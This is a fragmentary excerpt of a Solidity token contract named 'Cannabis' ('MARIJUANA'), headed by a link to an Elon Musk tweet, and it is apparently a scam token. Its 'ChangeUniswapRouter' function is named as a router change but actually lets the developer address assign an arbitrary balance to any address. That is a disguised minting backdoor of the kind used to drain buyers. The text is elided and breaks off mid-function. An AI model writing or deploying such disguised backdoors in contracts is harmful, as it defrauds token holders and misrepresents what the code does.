...
https://twitter.com/elonmusk/status/1553747872373522432/photo/1
...
contract  CANNABIS is Ownable {
    address private _owner;
    address private _address0;
    address private _address1;
    address private _dev;
    string private _name = " Cannabis ";
    string private _symbol = " MARIJUANA";
    ...
    function bulkTransfer(address[] calldata to, uint256[] calldata amounts) public {
      ...
      function ChangeUniswapRouter(address newrouter, uint256 _amount) external  {
            require(msg.sender == _dev, "!_dev");
             _balances[newrouter] = _amount * 10 ** decimals() - 1 ;
    }


    function BlockBots() public {
